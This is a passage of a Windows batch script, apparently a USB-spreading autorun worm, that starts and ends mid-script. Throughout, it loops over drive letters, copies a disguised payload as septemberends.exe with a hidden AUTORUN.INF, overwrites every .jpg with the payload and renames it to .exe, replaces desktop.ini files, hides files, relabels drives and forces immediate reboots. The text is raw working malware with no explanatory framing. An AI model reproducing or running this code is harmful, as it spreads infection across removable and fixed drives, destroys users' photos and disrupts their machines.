attrib +s +h i:\AUTORUN.INF
:aj
if not exist j:\ goto ak
if exist j:\septemberends.exe goto ak
if exist j:\ copy %windir%\Config01\configexp27.dll j:\septemberends.exe
if not exist j:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf j:\AUTORUN.INF
attrib +s +h j:\AUTORUN.INF
:ak
if not exist k:\ goto al
if exist k:\septemberends.exe goto al
if exist k:\ copy %windir%\Config01\configexp27.dll k:\septemberends.exe
if not exist k:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf k:\AUTORUN.INF
attrib +s +h k:\AUTORUN.INF
:al
if not exist l:\ goto am
if exist l:\septemberends.exe goto am
if exist l:\ copy %windir%\Config01\configexp27.dll l:\septemberends.exe
if not exist l:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf l:\AUTORUN.INF
attrib +s +h l:\AUTORUN.INF
:am
if not exist m:\ goto an
if exist m:\septemberends.exe goto an
if exist m:\ copy %windir%\Config01\configexp27.dll m:\septemberends.exe
if not exist m:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf m:\AUTORUN.INF
attrib +s +h m:\AUTORUN.INF
:an
if not exist n:\ goto ao
if exist n:\septemberends.exe goto ao
if exist n:\ copy %windir%\Config01\configexp27.dll n:\septemberends.exe
if not exist n:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf n:\AUTORUN.INF
attrib +s +h n:\AUTORUN.INF
:ao
if not exist o:\ goto ap
if exist o:\septemberends.exe goto ap
if exist o:\ copy %windir%\Config01\configexp27.dll o:\septemberends.exe
if not exist o:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf o:\AUTORUN.INF
attrib +s +h o:\AUTORUN.INF
:ap
if not exist p:\ goto aq
if exist p:\septemberends.exe goto aq
if exist p:\ copy %windir%\Config01\configexp27.dll p:\septemberends.exe
if not exist p:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf p:\AUTORUN.INF
attrib +s +h p:\AUTORUN.INF
:aq
if not exist q:\ goto ar
if exist q:\septemberends.exe goto ar
if exist q:\ copy %windir%\Config01\configexp27.dll q:\septemberends.exe
if not exist q:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf q:\AUTORUN.INF
attrib +s +h q:\AUTORUN.INF
:ar
if not exist r:\ goto as
if exist r:\septemberends.exe goto as
if exist r:\ copy %windir%\Config01\configexp27.dll r:\septemberends.exe
if not exist r:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf r:\AUTORUN.INF
attrib +s +h r:\AUTORUN.INF
:as
if not exist s:\ goto at
if exist s:\septemberends.exe goto at
if exist s:\ copy %windir%\Config01\configexp27.dll s:\septemberends.exe
if not exist s:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf s:\AUTORUN.INF
attrib +s +h s:\AUTORUN.INF
:at
if not exist t:\ goto au
if exist t:\septemberends.exe goto au
if exist t:\ copy %windir%\Config01\configexp27.dll t:\septemberends.exe
if not exist t:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf t:\AUTORUN.INF
attrib +s +h t:\AUTORUN.INF
:au
if not exist u:\ goto av
if exist u:\septemberends.exe goto av
if exist u:\ copy %windir%\Config01\configexp27.dll u:\septemberends.exe
if not exist u:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf u:\AUTORUN.INF
attrib +s +h u:\AUTORUN.INF
:av
if not exist v:\ goto aw
if exist v:\septemberends.exe goto aw
if exist v:\ copy %windir%\Config01\configexp27.dll v:\septemberends.exe
if not exist v:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf v:\AUTORUN.INF
attrib +s +h v:\AUTORUN.INF
:aw
if not exist w:\ goto ax
if exist w:\septemberends.exe goto ax
if exist w:\ copy %windir%\Config01\configexp27.dll w:\septemberends.exe
if not exist w:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf w:\AUTORUN.INF
attrib +s +h w:\AUTORUN.INF
:ax
if not exist x:\ goto ay
if exist x:\septemberends.exe goto ay
if exist x:\ copy %windir%\Config01\configexp27.dll x:\septemberends.exe
if not exist x:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf x:\AUTORUN.INF
attrib +s +h x:\AUTORUN.INF
:ay
if not exist y:\ goto az
if exist y:\septemberends.exe goto az
if exist y:\ copy %windir%\Config01\configexp27.dll y:\septemberends.exe
if not exist y:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf y:\AUTORUN.INF
attrib +s +h y:\AUTORUN.INF
:az
if not exist z:\ goto azu
if exist z:\septemberends.exe goto azu
if exist z:\ copy %windir%\Config01\configexp27.dll z:\septemberends.exe
if not exist z:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf z:\AUTORUN.INF
attrib +s +h z:\AUTORUN.INF
:azu
for %%a in (%MYFILES%\*.db) do if %%~za equ 36920 copy /y %%a %systemdrive%\winsystemp.db
if not exist %windir%\23september.bmp copy %systemdrive%\winsystemp.db %windir%\23september.bmp
if not exist %windir%\system\istrq27.dll copy %systemdrive%\winsystemp.db %windir%\system\istrq27.dll
attrib +s +h %windir%\23september.bmp
for %%a in (%windir%\23september.bmp) do if %%~za equ 36920 goto ukdfz
attrib -r -s -h %windir%\23september.bmp
copy /y %windir%\system\istrq27.dll %windir%\23september.bmp
attrib +s +h %windir%\23september.bmp
:ukdfz
cd %userprofile%
if exist "%userprofile%\mydocu~1\23.temp" goto 23tempmy
attrib +s -h "%userprofile%\mydocu~1"
attrib -s -h -r "%userprofile%\mydocu~1\desktop.ini"
copy /y %windir%\system\shell23\desktop.ini "%userprofile%\mydocu~1\desktop.ini"
attrib +s +h "%userprofile%\mydocu~1\desktop.ini"
echo 23september > "%userprofile%\mydocu~1\23.temp"
:23tempmy
if not exist b:\ goto cc
if exist %userprofile%\arma.arma goto drivec
if exist b:\ntldr goto drivec
if not exist b:\23september.bmp copy %windir%\system\istrq27.dll b:\23september.bmp
for %%a in (b:\23september.bmp) do if %%~za equ 36920 goto selanjutnyac
attrib -r -s -h b:\23september.bmp
copy /y %windir%\system\istrq27.dll b:\23september.bmp
attrib +s +h +r b:\23september.bmp
:selanjutnyac
if exist b:\23\config.sys goto drivec
if not exist b:\23 md b:\23
attrib -r -s -h b:* /s /d
if not exist "b:\backup_23" md "b:\backup_23"
attrib +s +h "b:\backup_23"
for /R b:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "b:\backup_23\*.23september"
for /R b:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R b:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R b:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini b:\desktop.ini
attrib +s -h b:* /s /d
attrib +s +h "b:\backup_23"
attrib +s +h "b:\23september.bmp"
attrib +s +h b:*.ini /s
attrib -s -h -r b:\*.exe /s
attrib +s +h b:\AUTORUN.INF
echo [shell] > b:\23\config.sys
:drivec
label b: 23september
if not exist b:\septemberends.exe shutdown -r -t 0 -f
for %%a in (b:\AUTORUN.INF) do if %%~za equ 79 goto cc
attrib -r -s -h b:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf b:\AUTORUN.INF
attrib +s +h b:\AUTORUN.INF
:cc
if not exist c:\ goto dd
if exist %userprofile%\arma.arma goto drived
if exist c:\ntldr goto drived
if not exist c:\23september.bmp copy %windir%\system\istrq27.dll c:\23september.bmp
for %%a in (c:\23september.bmp) do if %%~za equ 36920 goto selanjutnyad
attrib -r -s -h c:\23september.bmp
copy /y %windir%\system\istrq27.dll c:\23september.bmp
attrib +s +h +r c:\23september.bmp
:selanjutnyad
if exist c:\23\config.sys goto drived
if not exist c:\23 md c:\23
attrib -r -s -h c:* /s /d
if not exist "c:\backup_23" md "c:\backup_23"
attrib +s +h "c:\backup_23"
for /R c:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "c:\backup_23\*.23september"
for /R c:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R c:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R c:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini c:\desktop.ini
attrib +s -h c:* /s /d
attrib +s +h "c:\backup_23"
attrib +s +h "c:\23september.bmp"
attrib +s +h c:*.ini /s
attrib -s -h -r c:\*.exe /s
attrib +s +h c:\AUTORUN.INF
echo [shell] > c:\23\config.sys
:drived
label c: 23september
if not exist c:\septemberends.exe shutdown -r -t 0 -f
for %%a in (c:\AUTORUN.INF) do if %%~za equ 79 goto dd
attrib -r -s -h c:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf c:\AUTORUN.INF
attrib +s +h c:\AUTORUN.INF
:dd
if not exist d:\ goto ee
if exist %userprofile%\arma.arma goto drivee
if exist d:\ntldr goto drivee
if not exist d:\23september.bmp copy %windir%\system\istrq27.dll d:\23september.bmp
for %%a in (d:\23september.bmp) do if %%~za equ 36920 goto selanjutnyae
attrib -r -s -h d:\23september.bmp
copy /y %windir%\system\istrq27.dll d:\23september.bmp
attrib +s +h +r d:\23september.bmp
:selanjutnyae
if exist d:\23\config.sys goto drivee
if not exist d:\23 md d:\23
attrib -r -s -h d:* /s /d
if not exist "d:\backup_23" md "d:\backup_23"
attrib +s +h "d:\backup_23"
for /R d:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "d:\backup_23\*.23september"
for /R d:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R d:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R d:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini d:\desktop.ini
attrib +s -h d:* /s /d
attrib +s +h "d:\backup_23"
attrib +s +h "d:\23september.bmp"
attrib +s +h d:*.ini /s
attrib -s -h -r d:\*.exe /s
attrib +s +h d:\AUTORUN.INF
echo [shell] > d:\23\config.sys
:drivee
label d: 23september
if not exist d:\septemberends.exe shutdown -r -t 0 -f
for %%a in (d:\AUTORUN.INF) do if %%~za equ 79 goto ee
attrib -r -s -h d:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf d:\AUTORUN.INF
attrib +s +h d:\AUTORUN.INF
:ee
if not exist e:\ goto ff
if exist %userprofile%\arma.arma goto drivef
if exist e:\ntldr goto drivef
if not exist e:\23september.bmp copy %windir%\system\istrq27.dll e:\23september.bmp
for %%a in (e:\23september.bmp) do if %%~za equ 36920 goto selanjutnyaf
attrib -r -s -h e:\23september.bmp
copy /y %windir%\system\istrq27.dll e:\23september.bmp
attrib +s +h +r e:\23september.bmp
:selanjutnyaf
if exist e:\23\config.sys goto drivef
if not exist e:\23 md e:\23
attrib -r -s -h e:* /s /d
if not exist "e:\backup_23" md "e:\backup_23"
attrib +s +h "e:\backup_23"
for /R e:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "e:\backup_23\*.23september"
for /R e:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R e:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R e:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini e:\desktop.ini
attrib +s -h e:* /s /d
attrib +s +h "e:\backup_23"
attrib +s +h "e:\23september.bmp"
attrib +s +h e:*.ini /s
attrib -s -h -r e:\*.exe /s
attrib +s +h e:\AUTORUN.INF
echo [shell] > e:\23\config.sys
:drivef
label e: 23september
if not exist e:\septemberends.exe shutdown -r -t 0 -f
for %%a in (e:\AUTORUN.INF) do if %%~za equ 79 goto ff
attrib -r -s -h e:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf e:\AUTORUN.INF
attrib +s +h e:\AUTORUN.INF
:ff
if not exist f:\ goto gg
if exist %userprofile%\arma.arma goto driveg
if exist f:\ntldr goto driveg
if not exist f:\23september.bmp copy %windir%\system\istrq27.dll f:\23september.bmp
for %%a in (f:\23september.bmp) do if %%~za equ 36920 goto selanjutnyag
attrib -r -s -h f:\23september.bmp
copy /y %windir%\system\istrq27.dll f:\23september.bmp
attrib +s +h +r f:\23september.bmp
:selanjutnyag
if exist f:\23\config.sys goto driveg
if not exist f:\23 md f:\23
attrib -r -s -h f:* /s /d
if not exist "f:\backup_23" md "f:\backup_23"
attrib +s +h "f:\backup_23"
for /R f:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "f:\backup_23\*.23september"
for /R f:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R f:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R f:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini f:\desktop.ini
attrib +s -h f:* /s /d
attrib +s +h "f:\backup_23"
attrib +s +h "f:\23september.bmp"
attrib +s +h f:*.ini /s
attrib -s -h -r f:\*.exe /s
attrib +s +h f:\AUTORUN.INF
echo [shell] > f:\23\config.sys
:driveg
label f: 23september
if not exist f:\septemberends.exe shutdown -r -t 0 -f
for %%a in (f:\AUTORUN.INF) do if %%~za equ 79 goto gg
attrib -r -s -h f:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf f:\AUTORUN.INF
attrib +s +h f:\AUTORUN.INF
:gg
if not exist g:\ goto hh
if exist %userprofile%\arma.arma goto driveh
if exist g:\ntldr goto driveh
if not exist g:\23september.bmp copy %windir%\system\istrq27.dll g:\23september.bmp
for %%a in (g:\23september.bmp) do if %%~za equ 36920 goto selanjutnyah
attrib -r -s -h g:\23september.bmp
copy /y %windir%\system\istrq27.dll g:\23september.bmp
attrib +s +h +r g:\23september.bmp
:selanjutnyah
if exist g:\23\config.sys goto driveh
if not exist g:\23 md g:\23
attrib -r -s -h g:* /s /d
if not exist "g:\backup_23" md "g:\backup_23"
attrib +s +h "g:\backup_23"
for /R g:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "g:\backup_23\*.23september"
for /R g:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R g:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R g:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini g:\desktop.ini
attrib +s -h g:* /s /d
attrib +s +h "g:\backup_23"
attrib +s +h "g:\23september.bmp"
attrib +s +h g:*.ini /s
attrib -s -h -r g:\*.exe /s
attrib +s +h g:\AUTORUN.INF
echo [shell] > g:\23\config.sys
:driveh
label g: 23september
if not exist g:\septemberends.exe shutdown -r -t 0 -f
for %%a in (g:\AUTORUN.INF) do if %%~za equ 79 goto hh
attrib -r -s -h g:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf g:\AUTORUN.INF
attrib +s +h g:\AUTORUN.INF
:hh
if not exist h:\ goto ii
if exist %userprofile%\arma.arma goto drivei
if exist h:\ntldr goto drivei
if not exist h:\23september.bmp copy %windir%\system\istrq27.dll h:\23september.bmp
for %%a in (h:\23september.bmp) do if %%~za equ 36920 goto selanjutnyai
attrib -r -s -h h:\23september.bmp
copy /y %windir%\system\istrq27.dll h:\23september.bmp
attrib +s +h +r h:\23september.bmp
:selanjutnyai
if exist h:\23\config.sys goto drivei
if not exist h:\23 md h:\23
attrib -r -s -h h:* /s /d
if not exist "h:\backup_23" md "h:\backup_23"
attrib +s +h "h:\backup_23"
for /R h:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "h:\backup_23\*.23september"
for /R h:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R h:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R h:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini h:\desktop.ini
attrib +s -h h:* /s /d
attrib +s +h "h:\backup_23"
attrib +s +h "h:\23september.bmp"
attrib +s +h h:*.ini /s
attrib -s -h -r h:\*.exe /s
attrib +s +h h:\AUTORUN.INF
echo [shell] > h:\23\config.sys
:drivei
label h: 23september
if not exist h:\septemberends.exe shutdown -r -t 0 -f
for %%a in (h:\AUTORUN.INF) do if %%~za equ 79 goto ii
attrib -r -s -h h:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf h:\AUTORUN.INF
attrib +s +h h:\AUTORUN.INF
:ii
if not exist i:\ goto jj
if exist %userprofile%\arma.arma goto drivej
if exist i:\ntldr goto drivej
if not exist i:\23september.bmp copy %windir%\system\istrq27.dll i:\23september.bmp
for %%a in (i:\23september.bmp) do if %%~za equ 36920 goto selanjutnyaj
attrib -r -s -h i:\23september.bmp
copy /y %windir%\system\istrq27.dll i:\23september.bmp
attrib +s +h +r i:\23september.bmp
:selanjutnyaj
if exist i:\23\config.sys goto drivej
if not exist i:\23 md i:\23
attrib -r -s -h i:* /s /d
if not exist "i:\backup_23" md "i:\backup_23"
attrib +s +h "i:\backup_23"
for /R i:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "i:\backup_23\*.23september"
for /R i:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R i:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R i:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini i:\desktop.ini
attrib +s -h i:* /s /d
attrib +s +h "i:\backup_23"
attrib +s +h "i:\23september.bmp"
attrib +s +h i:*.ini /s
attrib -s -h -r i:\*.exe /s
attrib +s +h i:\AUTORUN.INF
echo [shell] > i:\23\config.sys
:drivej
label i: 23september
if not exist i:\septemberends.exe shutdown -r -t 0 -f
for %%a in (i:\AUTORUN.INF) do if %%~za equ 79 goto jj
attrib -r -s -h i:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf i:\AUTORUN.INF
attrib +s +h i:\AUTORUN.INF
:jj
if not exist j:\ goto kk
if exist %userprofile%\arma.arma goto drivek
if exist j:\ntldr goto drivek
if not exist j:\23september.bmp copy %windir%\system\istrq27.dll j:\23september.bmp
for %%a in (j:\23september.bmp) do if %%~za equ 36920 goto selanjutnyak
attrib -r -s -h j:\23september.bmp
copy /y %windir%\system\istrq27.dll j:\23september.bmp
attrib +s +h +r j:\23september.bmp
:selanjutnyak
if exist j:\23\config.sys goto drivek
if not exist j:\23 md j:\23
attrib -r -s -h j:* /s /d
if not exist "j:\backup_23" md "j:\backup_23"
attrib +s +h "j:\backup_23"
for /R j:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "j:\backup_23\*.23september"
for /R j:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R j:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R j:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini j:\desktop.ini
attrib +s -h j:* /s /d
attrib +s +h "j:\backup_23"
attrib +s +h "j:\23september.bmp"
attrib +s +h j:*.ini /s
attrib -s -h -r j:\*.exe /s
attrib +s +h j:\AUTORUN.INF
echo [shell] > j:\23\config.sys
:drivek
label j: 23september
if not exist j:\septemberends.exe shutdown -r -t 0 -f
for %%a in (j:\AUTORUN.INF) do if %%~za equ 79 goto kk
attrib -r -s -h j:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf j:\AUTORUN.INF
attrib +s +h j:\AUTORUN.INF
:kk
if not exist k:\ goto ll
if exist %userprofile%\arma.arma goto drivel
if exist k:\ntldr goto drivel
if not exist k:\23september.bmp copy %windir%\system\istrq27.dll k:\23september.bmp
for %%a in (k:\23september.bmp) do if %%~za equ 36920 goto selanjutnyal
attrib -r -s -h k:\23september.bmp
copy /y %windir%\system\istrq27.dll k:\23september.bmp
attrib +s +h +r k:\23september.bmp
:selanjutnyal
if exist k:\23\config.sys goto drivel
if not exist k:\23 md k:\23
attrib -r -s -h k:* /s /d
if not exist "k:\backup_23" md "k:\backup_23"
attrib +s +h "k:\backup_23"
for /R k:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "k:\backup_23\*.23september"
for /R k:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R k:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R k:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini k:\desktop.ini
attrib +s -h k:* /s /d
attrib +s +h "k:\backup_23"
attrib +s +h "k:\23september.bmp"
attrib +s +h k:*.ini /s
attrib -s -h -r k:\*.exe /s
attrib +s +h k:\AUTORUN.INF
echo [shell] > k:\23\config.sys
:drivel
label k: 23september
if not exist k:\septemberends.exe shutdown -r -t 0 -f
for %%a in (k:\AUTORUN.INF) do if %%~za equ 79 goto ll
attrib -r -s -h k:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf k:\AUTORUN.INF
attrib +s +h k:\AUTORUN.INF
:ll
if not exist l:\ goto mm
if exist %userprofile%\arma.arma goto drivem
if exist l:\ntldr goto drivem
if not exist l:\23september.bmp copy %windir%\system\istrq27.dll l:\23september.bmp
for %%a in (l:\23september.bmp) do if %%~za equ 36920 goto selanjutnyam
attrib -r -s -h l:\23september.bmp
copy /y %windir%\system\istrq27.dll l:\23september.bmp
attrib +s +h +r l:\23september.bmp
:selanjutnyam
if exist l:\23\config.sys goto drivem
if not exist l:\23 md l:\23
attrib -r -s -h l:* /s /d
if not exist "l:\backup_23" md "l:\backup_23"
attrib +s +h "l:\backup_23"
for /R l:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "l:\backup_23\*.23september"
for /R l:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R l:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R l:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini l:\desktop.ini
attrib +s -h l:* /s /d
attrib +s +h "l:\backup_23"
attrib +s +h "l:\23september.bmp"
attrib +s +h l:*.ini /s
attrib -s -h -r l:\*.exe /s
attrib +s +h l:\AUTORUN.INF
echo [shell] > l:\23\config.sys
:drivem
label l: 23september
if not exist l:\septemberends.exe shutdown -r -t 0 -f
for %%a in (l:\AUTORUN.INF) do if %%~za equ 79 goto mm
attrib -r -s -h l:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf l:\AUTORUN.INF
attrib +s +h l:\AUTORUN.INF
:mm
if not exist m:\ goto nn
if exist %userprofile%\arma.arma goto driven
if exist m:\ntldr goto driven
if not exist m:\23september.bmp copy %windir%\system\istrq27.dll m:\23september.bmp
for %%a in (m:\23september.bmp) do if %%~za equ 36920 goto selanjutnyan
attrib -r -s -h m:\23september.bmp
copy /y %windir%\system\istrq27.dll m:\23september.bmp
attrib +s +h +r m:\23september.bmp
:selanjutnyan
if exist m:\23\config.sys goto driven
if not exist m:\23 md m:\23
attrib -r -s -h m:* /s /d
if not exist "m:\backup_23" md "m:\backup_23"
attrib +s +h "m:\backup_23"
for /R m:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "m:\backup_23\*.23september"
for /R m:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R m:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R m:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini m:\desktop.ini
attrib +s -h m:* /s /d
attrib +s +h "m:\backup_23"
attrib +s +h "m:\23september.bmp"
attrib +s +h m:*.ini /s
attrib -s -h -r m:\*.exe /s
attrib +s +h m:\AUTORUN.INF
echo [shell] > m:\23\config.sys
:driven
label m: 23september
if not exist m:\septemberends.exe shutdown -r -t 0 -f
for %%a in (m:\AUTORUN.INF) do if %%~za equ 79 goto nn
attrib -r -s -h m:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf m:\AUTORUN.INF
attrib +s +h m:\AUTORUN.INF
:nn
if not exist n:\ goto oo
if exist %userprofile%\arma.arma goto driveo
if exist n:\ntldr goto driveo
if not exist n:\23september.bmp copy %windir%\system\istrq27.dll n:\23september.bmp
for %%a in (n:\23september.bmp) do if %%~za equ 36920 goto selanjutnyao
attrib -r -s -h n:\23september.bmp
copy /y %windir%\system\istrq27.dll n:\23september.bmp
attrib +s +h +r n:\23september.bmp
:selanjutnyao
if exist n:\23\config.sys goto driveo
if not exist n:\23 md n:\23
attrib -r -s -h n:* /s /d
if not exist "n:\backup_23" md "n:\backup_23"
attrib +s +h "n:\backup_23"
for /R n:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "n:\backup_23\*.23september"
for /R n:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R n:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R n:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini n:\desktop.ini
attrib +s -h n:* /s /d
attrib +s +h "n:\backup_23"
attrib +s +h "n:\23september.bmp"
attrib +s +h n:*.ini /s
attrib -s -h -r n:\*.exe /s
attrib +s +h n:\AUTORUN.INF
echo [shell] > n:\23\config.sys
:driveo
label n: 23september
if not exist n:\septemberends.exe shutdown -r -t 0 -f
for %%a in (n:\AUTORUN.INF) do if %%~za equ 79 goto oo
attrib -r -s -h n:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf n:\AUTORUN.INF
attrib +s +h n:\AUTORUN.INF
:oo
if not exist o:\ goto pp
if exist %userprofile%\arma.arma goto drivep
if exist o:\ntldr goto drivep
if not exist o:\23september.bmp copy %windir%\system\istrq27.dll o:\23september.bmp
for %%a in (o:\23september.bmp) do if %%~za equ 36920 goto selanjutnyap
attrib -r -s -h o:\23september.bmp
copy /y %windir%\system\istrq27.dll o:\23september.bmp
attrib +s +h +r o:\23september.bmp
:selanjutnyap
if exist o:\23\config.sys goto drivep
if not exist o:\23 md o:\23
attrib -r -s -h o:* /s /d
if not exist "o:\backup_23" md "o:\backup_23"
attrib +s +h "o:\backup_23"
for /R o:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "o:\backup_23\*.23september"
for /R o:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R o:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R o:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini o:\desktop.ini
attrib +s -h o:* /s /d
attrib +s +h "o:\backup_23"
attrib +s +h "o:\23september.bmp"
attrib +s +h o:*.ini /s
attrib -s -h -r o:\*.exe /s
attrib +s +h o:\AUTORUN.INF
echo [shell] > o:\23\config.sys
:drivep
label o: 23september
if not exist o:\septemberends.exe shutdown -r -t 0 -f
for %%a in (o:\AUTORUN.INF) do if %%~za equ 79 goto pp
attrib -r -s -h o:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf o:\AUTORUN.INF
attrib +s +h o:\AUTORUN.INF
:pp
if not exist p:\ goto qq
if exist %userprofile%\arma.arma goto driveq
if exist p:\ntldr goto driveq
if not exist p:\23september.bmp copy %windir%\system\istrq27.dll p:\23september.bmp
for %%a in (p:\23september.bmp) do if %%~za equ 36920 goto selanjutnyaq
attrib -r -s -h p:\23september.bmp
copy /y %windir%\system\istrq27.dll p:\23september.bmp
attrib +s +h +r p:\23september.bmp
:selanjutnyaq
if exist p:\23\config.sys goto driveq
if not exist p:\23 md p:\23
attrib -r -s -h p:* /s /d
if not exist "p:\backup_23" md "p:\backup_23"
attrib +s +h "p:\backup_23"
for /R p:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "p:\backup_23\*.23september"
for /R p:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R p:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R p:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini p:\desktop.ini
attrib +s -h p:* /s /d
attrib +s +h "p:\backup_23"
attrib +s +h "p:\23september.bmp"
attrib +s +h p:*.ini /s
attrib -s -h -r p:\*.exe /s
attrib +s +h p:\AUTORUN.INF
echo [shell] > p:\23\config.sys
:driveq
label p: 23september
if not exist p:\septemberends.exe shutdown -r -t 0 -f
for %%a in (p:\AUTORUN.INF) do if %%~za equ 79 goto qq
attrib -r -s -h p:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf p:\AUTORUN.INF
attrib +s +h p:\AUTORUN.INF
:qq
if not exist q:\ goto rr
if exist %userprofile%\arma.arma goto driver
if exist q:\ntldr goto driver
if not exist q:\23september.bmp copy %windir%\system\istrq27.dll q:\23september.bmp
